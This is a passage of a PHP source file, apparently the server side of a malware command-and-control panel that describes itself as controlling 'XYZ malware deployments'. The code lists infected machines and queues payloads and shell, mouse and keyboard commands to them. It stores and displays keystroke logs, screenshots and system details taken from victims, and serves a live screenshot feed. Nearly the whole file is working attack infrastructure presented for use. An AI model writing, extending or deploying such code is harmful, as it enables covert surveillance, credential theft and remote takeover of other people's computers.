                                        <label for="webrtcTerminalSelect" class="form-label">Select Terminal</label>
                                        <select class="form-select" id="webrtcTerminalSelect" required>
                                            <option value="">Choose a terminal...</option>';
    
    foreach ($terminals as $terminal) {
        $timeSince = time() - $terminal['last_seen'];
        $status = ($timeSince < 60) ? 'ONLINE' : 'OFFLINE';
        echo '<option value="' . htmlspecialchars($terminal['id']) . '">' . htmlspecialchars($terminal['id']) . ' (' . $status . ')</option>';
    }
    
    echo '              </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label for="webrtcCandidates" class="form-label">ICE Candidates (JSON)</label>
                                        <textarea class="form-control" id="webrtcCandidates" rows="3" placeholder=\'[{"candidate":"candidate:1 1 UDP 2130706431 192.168.1.100 8998 typ host","sdpMid":"0","sdpMLineIndex":0}]\'></textarea>
                                    </div>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-warning">
                                <i class="bi bi-camera-video"></i> Send WebRTC Candidates
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Remote Command Section -->
        <div class="row">
            <div class="col-12">
                <div class="card command-section">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <i class="bi bi-terminal"></i> Remote Command Execution
                        </h5>
                    </div>
                    <div class="card-body">
                        <p>Send remote commands to terminals for immediate execution.</p>
                        <form id="commandForm">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label for="commandTerminalSelect" class="form-label">Select Terminal</label>
                                        <select class="form-select" id="commandTerminalSelect" required>
                                            <option value="">Choose a terminal...</option>';
    
    foreach ($terminals as $terminal) {
        $timeSince = time() - $terminal['last_seen'];
        $status = ($timeSince < 60) ? 'ONLINE' : 'OFFLINE';
        echo '<option value="' . htmlspecialchars($terminal['id']) . '">' . htmlspecialchars($terminal['id']) . ' (' . $status . ')</option>';
    }
    
    echo '              </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label for="commandType" class="form-label">Command Type</label>
                                        <select class="form-select" id="commandType">
                                            <option value="shell">Shell Command</option>
                                            <option value="mouse">Mouse Control</option>
                                            <option value="keyboard">Keyboard Input</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="mb-3">
                                        <label for="commandText" class="form-label">Command</label>
                                        <textarea class="form-control" id="commandText" rows="2" placeholder="Enter command to execute"></textarea>
                                    </div>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-success">
                                <i class="bi bi-terminal"></i> Send Command
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Data Collection Section -->
        <div class="row">
            <div class="col-12">
                <div class="card data-section">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <i class="bi bi-collection"></i> Data Collection
                        </h5>
                    </div>
                    <div class="card-body">
                        <p>The malware collects and sends the following data to this C2 server:</p>
                        <ul>
                            <li><strong>System Information:</strong> OS version, architecture, hostname, username, processor, memory, disk info, network interfaces, GPU, antivirus software, installed programs</li>
                            <li><strong>Keylogs:</strong> Keystrokes captured by the keylogger module</li>
                            <li><strong>Screenshots:</strong> Periodic screenshots of the target machine</li>
                            <li><strong>WebRTC Candidates:</strong> Connection information for WebRTC remote control</li>
                            <li><strong>Version Information:</strong> Current malware version for update management</li>
                        </ul>
                        <p>All data is sent in a single POST request every minute through the daemon communication channel.</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Terminals Table -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <h5 class="mb-0">
                            <i class="bi bi-display"></i> Active Terminals
                        </h5>
                        <button class="btn btn-sm btn-outline-light" onclick="location.reload()">
                            <i class="bi bi-arrow-clockwise"></i> Refresh
                        </button>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th>IP Address</th>
                                        <th>OS</th>
                                        <th>Status</th>
                                        <th>Last Seen</th>
                                        <th>Time Since</th>
                                        <th>Data Collected</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>';
    
    foreach ($terminals as $terminal) {
        $lastSeen = date('Y-m-d H:i:s', $terminal['last_seen']);
        $timeSince = time() - $terminal['last_seen'];
        $timeSinceFormatted = formatTimeSince($timeSince);
        $osInfo = isset($terminal['os']) ? $terminal['os'] : 'Unknown';
        
        // Get data collection info for this terminal
        $dataInfo = getTerminalDataCollectionInfo($terminal['id']);
        
        // Determine status based on time since last update
        $status = ($timeSince < 60) ? '<span class="status-online"><i class="bi bi-circle-fill"></i> ONLINE</span>' : '<span class="status-offline"><i class="bi bi-circle-fill"></i> OFFLINE</span>';
        
        // Build data collection badges
        $dataBadges = '';
        if ($dataInfo['keylogs'] > 0) {
            $dataBadges .= '<span class="badge bg-success data-badge">K:' . $dataInfo['keylogs'] . '</span>';
        }
        if ($dataInfo['screenshots'] > 0) {
            $dataBadges .= '<span class="badge bg-primary data-badge">S:' . $dataInfo['screenshots'] . '</span>';
        }
        if ($dataInfo['system_info']) {
            $dataBadges .= '<span class="badge bg-info data-badge">SYS</span>';
        }
        if ($dataInfo['webrtc_support']) {
            $dataBadges .= '<span class="badge bg-warning data-badge">RTC</span>';
        }
        
        echo '<tr>
                <td>' . htmlspecialchars($terminal['id']) . '</td>
                <td>' . htmlspecialchars($terminal['ip']) . '</td>
                <td>' . htmlspecialchars($osInfo) . '</td>
                <td>' . $status . '</td>
                <td>' . $lastSeen . '</td>
                <td>' . $timeSinceFormatted . ' ago</td>
                <td>' . $dataBadges . '</td>
                <td>
                    <button class="btn btn-sm btn-outline-primary" onclick="viewTerminal(\'' . htmlspecialchars($terminal['id']) . '\')">
                        <i class="bi bi-eye"></i> View
                    </button>
                    <button class="btn btn-sm btn-outline-warning" onclick="sendPayloadToTerminal(\'' . htmlspecialchars($terminal['id']) . '\')">
                        <i class="bi bi-send"></i> Payload
                    </button>
                    <button class="btn btn-sm btn-outline-info" onclick="sendWebRTCtoTerminal(\'' . htmlspecialchars($terminal['id']) . '\')">
                        <i class="bi bi-camera-video"></i> WebRTC
                    </button>
                    <button class="btn btn-sm btn-outline-success" onclick="sendCommandToTerminal(\'' . htmlspecialchars($terminal['id']) . '\')">
                        <i class="bi bi-terminal"></i> Command
                    </button>
                </td>
              </tr>';
    }
    
    echo '</tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <i class="bi bi-info-circle"></i> System Information
                        </h5>
                    </div>
                    <div class="card-body">
                        <p>This C2 panel provides full control over XYZ malware deployments. Features include:</p>
                        <ul>
                            <li>Real-time terminal monitoring</li>
                            <li>Remote payload delivery to specific terminals</li>
                            <li>System information collection</li>
                            <li>Screenshot and keylogger data retrieval</li>
                            <li>Direct WebRTC remote control</li>
                            <li>Remote command execution</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Auto-refresh every 1.5 seconds for live feeds
        setInterval(function() {
            refreshFeeds();
        }, 1500);
        
        function refreshFeeds() {
            const images = document.querySelectorAll(".live-feed img");
            const timestamp = new Date().getTime();
            images.forEach(function(img) {
                // Add fade effect
                img.style.opacity = "0";
                setTimeout(function() {
                    // Add timestamp to force refresh
                    const src = img.src.split("?")[0];
                    img.src = src + "?t=" + timestamp;
                    img.onload = function() {
                        img.style.opacity = "1";
                    };
                    // Fallback in case image fails to load
                    img.onerror = function() {
                        img.style.opacity = "1";
                    };
                }, 150);
            });
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(function() {
            location.reload();
        }, 30000);
        
        // Payload form submission
        document.getElementById("payloadForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const terminalId = document.getElementById("terminalSelect").value;
            const payloadFile = document.getElementById("payloadFile").value;
            
            if (!terminalId || !payloadFile) {
                alert("Please select a terminal and specify a payload file");
                return;
            }
            
            // Send payload request
            fetch("/admin/sendpayload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    terminal_id: terminalId,
                    payload_file: payloadFile
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    alert("Payload scheduled for delivery to terminal " + terminalId);
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(error => {
                alert("Error sending payload: " + error.message);
            });
        });
        
        // WebRTC form submission
        document.getElementById("webrtcForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const terminalId = document.getElementById("webrtcTerminalSelect").value;
            const candidates = document.getElementById("webrtcCandidates").value;
            
            if (!terminalId || !candidates) {
                alert("Please select a terminal and provide ICE candidates");
                return;
            }
            
            try {
                JSON.parse(candidates); // Validate JSON
            } catch (e) {
                alert("Invalid JSON format for ICE candidates");
                return;
            }
            
            // Send WebRTC candidates
            fetch("/admin/webrtc", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    terminal_id: terminalId,
                    candidates: JSON.parse(candidates)
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    alert("WebRTC candidates sent to terminal " + terminalId);
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(error => {
                alert("Error sending WebRTC candidates: " + error.message);
            });
        });
        
        // Command form submission
        document.getElementById("commandForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const terminalId = document.getElementById("commandTerminalSelect").value;
            const command = document.getElementById("commandText").value;
            const commandType = document.getElementById("commandType").value;
            
            if (!terminalId || !command) {
                alert("Please select a terminal and enter a command");
                return;
            }
            
            // Send command
            fetch("/admin/command", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    terminal_id: terminalId,
                    command: command,
                    type: commandType
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    alert("Command queued for delivery to terminal " + terminalId);
                    document.getElementById("commandText").value = ""; // Clear command field
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(error => {
                alert("Error sending command: " + error.message);
            });
        });
        
        function viewTerminal(terminalId) {
            alert("Terminal details view for: " + terminalId + " (Feature coming soon)");
        }
        
        function sendPayloadToTerminal(terminalId) {
            document.getElementById("terminalSelect").value = terminalId;
            // Scroll to payload section
            document.querySelector(".payload-section").scrollIntoView({ behavior: "smooth" });
        }
        
        function sendWebRTCtoTerminal(terminalId) {
            document.getElementById("webrtcTerminalSelect").value = terminalId;
            // Scroll to WebRTC section
            document.querySelector(".webrtc-section").scrollIntoView({ behavior: "smooth" });
        }
        
        function sendCommandToTerminal(terminalId) {
            document.getElementById("commandTerminalSelect").value = terminalId;
            // Scroll to command section
            document.querySelector(".command-section").scrollIntoView({ behavior: "smooth" });
        }
    </script>
</body>
</html>';
}

function formatTimeSince($seconds) {
    if ($seconds < 60) {
        return $seconds . " seconds";
    } elseif ($seconds < 3600) {
        return floor($seconds / 60) . " minutes";
    } else {
        return floor($seconds / 3600) . " hours";
    }
}

function updateTerminalStatus($id, $data = []) {
    // Create terminals file if it doesn't exist
    $terminalsFile = 'terminals.json';
    $terminals = [];
    
    if (file_exists($terminalsFile)) {
        $terminals = json_decode(file_get_contents($terminalsFile), true);
        if (!is_array($terminals)) {
            $terminals = [];
        }
    }
    
    // Update or add terminal with current timestamp
    $terminals[$id] = [
        'id' => $id,
        'last_seen' => time(),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'version' => $data['version'] ?? 'unknown',
        'os' => $data['os'] ?? 'unknown',
        'arch' => $data['arch'] ?? 'unknown',
        'hostname' => $data['hostname'] ?? 'unknown',
        'username' => $data['username'] ?? 'unknown'
    ];
    
    // Save updated terminals list
    file_put_contents($terminalsFile, json_encode($terminals));
}

function updateTerminalFile($terminalId, $fileName, $fileType, $fileSize) {
    // Update terminal with file information
    $terminalsFile = 'terminals.json';
    
    if (file_exists($terminalsFile)) {
        $terminals = json_decode(file_get_contents($terminalsFile), true);
        if (is_array($terminals) && isset($terminals[$terminalId])) {
            if (!isset($terminals[$terminalId]['files'])) {
                $terminals[$terminalId]['files'] = [];
            }
            
            $terminals[$terminalId]['files'][] = [
                'name' => $fileName,
                'type' => $fileType,
                'size' => $fileSize,
                'timestamp' => time()
            ];
            
            file_put_contents($terminalsFile, json_encode($terminals));
        }
    }
}

function updateTerminalSystemInfo($terminalId, $sysInfo) {
    // Update terminal with system information
    $terminalsFile = 'terminals.json';
    
    if (file_exists($terminalsFile)) {
        $terminals = json_decode(file_get_contents($terminalsFile), true);
        if (is_array($terminals) && isset($terminals[$terminalId])) {
            $terminals[$terminalId]['system_info'] = $sysInfo;
            file_put_contents($terminalsFile, json_encode($terminals));
        }
    }
}

function markTerminalForPayload($terminalId, $payloadFile) {
    // Mark terminal to receive payload on next check-in
    $payloadQueueFile = 'payload_queue.json';
    $queue = [];
    
    if (file_exists($payloadQueueFile)) {
        $queue = json_decode(file_get_contents($payloadQueueFile), true);
        if (!is_array($queue)) {
            $queue = [];
        }
    }
    
    $queue[$terminalId] = [
        'terminal_id' => $terminalId,
        'payload_file' => $payloadFile,
        'timestamp' => time()
    ];
    
    file_put_contents($payloadQueueFile, json_encode($queue));
}

function shouldSendZipToTerminal($terminalId, $version) {
    // Create flags file if it doesn't exist
    $flagsFile = 'terminal_flags.json';
    
    if (!file_exists($flagsFile)) {
        return true; // No flags file, so send ZIP
    }
    
    $flags = json_decode(file_get_contents($flagsFile), true);
    if (!is_array($flags)) {
        return true; // Invalid flags file, so send ZIP
    }
    
    // Check if terminal has entry and if version matches
    if (isset($flags[$terminalId]) && isset($flags[$terminalId]['xversion'])) {
        // Terminal has received a version before, check if it's the current one
        return $flags[$terminalId]['xversion'] !== $version;
    }
    
    // Terminal has no entry or no version, so send ZIP
    return true;
}

function markTerminalAsUpdated($terminalId, $version) {
    // Create flags file if it doesn't exist
    $flagsFile = 'terminal_flags.json';
    $flags = [];
    
    if (file_exists($flagsFile)) {
        $flags = json_decode(file_get_contents($flagsFile), true);
        if (!is_array($flags)) {
            $flags = [];
        }
    }
    
    // Update or add terminal flag with current version
    $flags[$terminalId] = [
        'id' => $terminalId,
        'xversion' => $version,
        'last_sent' => time()
    ];
    
    // Save updated flags
    file_put_contents($flagsFile, json_encode($flags));
}

function cleanupTerminals() {
    $terminalsFile = 'terminals.json';
    
    if (!file_exists($terminalsFile)) {
        return;
    }
    
    $terminals = json_decode(file_get_contents($terminalsFile), true);
    if (!is_array($terminals)) {
        return;
    }
    
    $currentTime = time();
    $updatedTerminals = [];
    
    // Keep only terminals seen in the last 5 minutes (300 seconds)
    foreach ($terminals as $id => $terminal) {
        if (isset($terminal['last_seen']) && ($currentTime - $terminal['last_seen']) <= 300) {
            $updatedTerminals[$id] = $terminal;
        } else {
            // Log when a terminal is removed
            $logMessage = "Removing terminal " . $id . " - last seen " . ($currentTime - $terminal['last_seen']) . " seconds ago\n";
            error_log($logMessage);
        }
    }
    
    // Save cleaned up terminals list
    file_put_contents($terminalsFile, json_encode($updatedTerminals));
}

function getOnlineTerminals() {
    $terminalsFile = 'terminals.json';
    
    if (!file_exists($terminalsFile)) {
        return [];
    }
    
    $terminals = json_decode(file_get_contents($terminalsFile), true);
    if (!is_array($terminals)) {
        return [];
    }
    
    // Return just the terminal data, not the associative array keys
    return array_values($terminals);
}

function getTerminalDetails($terminalId) {
    $terminalsFile = 'terminals.json';
    
    if (!file_exists($terminalsFile)) {
        return null;
    }
    
    $terminals = json_decode(file_get_contents($terminalsFile), true);
    if (!is_array($terminals) || !isset($terminals[$terminalId])) {
        return null;
    }
    
    return $terminals[$terminalId];
}

function getTerminalDataCollectionInfo($terminalId) {
    // Get information about what data this terminal has collected
    $info = [
        'keylogs' => 0,
        'screenshots' => 0,
        'system_info' => false,
        'webrtc_support' => false
    ];
    
    // Count keylog files
    $keylogDir = 'uploads/' . $terminalId;
    if (is_dir($keylogDir)) {
        $keylogFiles = glob($keylogDir . '/keylog_*.txt');
        $info['keylogs'] = count($keylogFiles);
    }
    
    // Count screenshot files
    if (is_dir($keylogDir)) {
        $screenshotFiles = glob($keylogDir . '/screenshot_*.png');
        if (empty($screenshotFiles)) {
            // Check for other possible screenshot formats
            $screenshotFiles = glob($keylogDir . '/screenshot_*.jpg');
            if (empty($screenshotFiles)) {
                $screenshotFiles = glob($keylogDir . '/screenshot_*.jpeg');
            }
        }
        $info['screenshots'] = count($screenshotFiles);
    }
    
    // Check for system info
    $sysInfoDir = 'systeminfo/' . $terminalId;
    if (is_dir($sysInfoDir)) {
        $sysInfoFiles = glob($sysInfoDir . '/info_*.json');
        $info['system_info'] = count($sysInfoFiles) > 0;
    }
    
    // Check for WebRTC support
    $webRTCCandidatesFile = 'webrtc/' . $terminalId . '_candidates.json';
    $info['webrtc_support'] = file_exists($webRTCCandidatesFile);
    
    return $info;
}

function validatePayloadFile($payloadFile) {
    // Validate that the payload file exists and is within the allowed directory
    $allowedDir = __DIR__; // Current directory
    $realPath = realpath($payloadFile);
    
    // Check if file exists
    if (!$realPath || !file_exists($realPath)) {
        return false;
    }
    
    // Check if file is within allowed directory
    if (strpos($realPath, $allowedDir) !== 0) {
        return false;
    }
    
    // Check file extension (only allow .zip files)
    $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
    if ($extension !== 'zip') {
        return false;
    }
    
    return true;
}

function getPayloadDeliveryHistory($terminalId) {
    // Get history of payload deliveries to this terminal
    $historyFile = 'payload_delivery_history.json';
    $history = [];
    
    if (file_exists($historyFile)) {
        $historyData = json_decode(file_get_contents($historyFile), true);
        if (is_array($historyData) && isset($historyData[$terminalId])) {
            $history = $historyData[$terminalId];
        }
    }
    
    return $history;
}

function logPayloadDelivery($terminalId, $payloadFile) {
    // Log payload delivery to history
    $historyFile = 'payload_delivery_history.json';
    $history = [];
    
    if (file_exists($historyFile)) {
        $history = json_decode(file_get_contents($historyFile), true);
        if (!is_array($history)) {
            $history = [];
        }
    }
    
    if (!isset($history[$terminalId])) {
        $history[$terminalId] = [];
    }
    
    $history[$terminalId][] = [
        'payload_file' => $payloadFile,
        'timestamp' => time(),
        'ip' => $_SERVER['REMOTE_ADDR']
    ];
    
    file_put_contents($historyFile, json_encode($history));
}

function getAllDataCollectionInfo() {
    // Get comprehensive data collection information for all terminals
    $terminals = getOnlineTerminals();
    $collectionInfo = [];
    
    foreach ($terminals as $terminal) {
        $terminalId = $terminal['id'];
        $collectionInfo[$terminalId] = getTerminalDataCollectionInfo($terminalId);
    }
    
    return $collectionInfo;
}

function handleFileList() {
    header("Content-Type: application/json");
    
    $terminalId = $_GET['terminal'] ?? '';
    
    if (empty($terminalId)) {
        http_response_code(400);
        echo json_encode(['error' => 'Terminal ID required']);
        return;
    }
    
    $uploadDir = 'uploads/' . $terminalId;
    
    if (!is_dir($uploadDir)) {
        echo json_encode(['files' => []]);
        return;
    }
    
    $files = [];
    $handle = opendir($uploadDir);
    
    while (($entry = readdir($handle)) !== false) {
        if ($entry != "." && $entry != "..") {
            $filePath = $uploadDir . '/' . $entry;
            $files[] = [
                'name' => $entry,
                'size' => filesize($filePath),
                'modified' => filemtime($filePath)
            ];
        }
    }
    
    closedir($handle);
    
    echo json_encode(['files' => $files]);
}

// Add new function to handle live feed requests
function handleLiveFeed() {
    global $requestUri;
    
    // Extract terminal ID from the URL
    $pattern = '/\/api\/livefeed\/([a-zA-Z0-9\-_]+)/';
    if (preg_match($pattern, $requestUri, $matches)) {
        $terminalId = $matches[1];
        
        // Create uploads directory if it doesn't exist
        $uploadDir = 'uploads/' . $terminalId;
        if (!is_dir($uploadDir)) {
            http_response_code(404);
            // Serve default image
            header("Content-Type: image/svg+xml");
            echo '<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#333"/><text x="50%" y="50%" font-family="Arial" font-size="18px" fill="#666" text-anchor="middle">No Feed</text></svg>';
            exit();
        }
        
        // Get all screenshot files for this terminal
        $screenshotFiles = glob($uploadDir . '/screenshot_*.png');
        if (empty($screenshotFiles)) {
            $screenshotFiles = glob($uploadDir . '/screenshot_*.jpg');
            if (empty($screenshotFiles)) {
                $screenshotFiles = glob($uploadDir . '/screenshot_*.jpeg');
            }
        }
        
        if (empty($screenshotFiles)) {
            http_response_code(404);
            // Serve default image
            header("Content-Type: image/svg+xml");
            echo '<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#333"/><text x="50%" y="50%" font-family="Arial" font-size="18px" fill="#666" text-anchor="middle">No Feed</text></svg>';
            exit();
        }
        
        // Sort files by modification time (newest first)
        usort($screenshotFiles, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        // Get the most recent screenshot
        $latestScreenshot = $screenshotFiles[0];
        
        // Serve the image
        $fileExtension = strtolower(pathinfo($latestScreenshot, PATHINFO_EXTENSION));
        if ($fileExtension === 'png') {
            header("Content-Type: image/png");
        } else {
            header("Content-Type: image/jpeg");
        }
        
        // Add cache control headers to prevent caching
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        
        // Add timestamp to filename to prevent caching
        header("Content-Disposition: inline; filename=screenshot_" . time() . "." . $fileExtension);
        
        // Read and output the image
        readfile($latestScreenshot);
        exit();
    } else {
        http_response_code(400);
        // Serve default image
        header("Content-Type: image/svg+xml");
        echo '<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#333"/><text x="50%" y="50%" font-family="Arial" font-size="18px" fill="#666" text-anchor="middle">Invalid ID</text></svg>';
        exit();
    }
}

// Add cleanup functions at the end of the file
function cleanupOldData() {
    // Clean up old screenshots, system info, and WebRTC files
    // Keep only the most recent files
    
    // Clean up screenshots and keylogs
    cleanupDirectory('uploads', 5); // Keep last 5 files per terminal
    
    // Clean up system info files
    cleanupDirectory('systeminfo', 5); // Keep last 5 system info files per terminal
    
    // Clean up WebRTC files (keep last 5 per terminal)
    cleanupDirectory('webrtc', 5);
}

function cleanupDirectory($baseDir, $keepCount) {
    if (!is_dir($baseDir)) {
        return;
    }
    
    // Get all terminal directories
    $terminalDirs = glob($baseDir . '/*', GLOB_ONLYDIR);
    
    foreach ($terminalDirs as $terminalDir) {
        if (is_dir($terminalDir)) {
            // Get all files in this directory
            $files = glob($terminalDir . '/*');
            
            // Sort files by modification time (newest first)
            usort($files, function($a, $b) {
                return filemtime($b) - filemtime($a);
            });
            
            // Remove old files, keeping only the specified count
            for ($i = $keepCount; $i < count($files); $i++) {
                if (is_file($files[$i])) {
                    unlink($files[$i]);
                }
            }
        }
    }
}
?>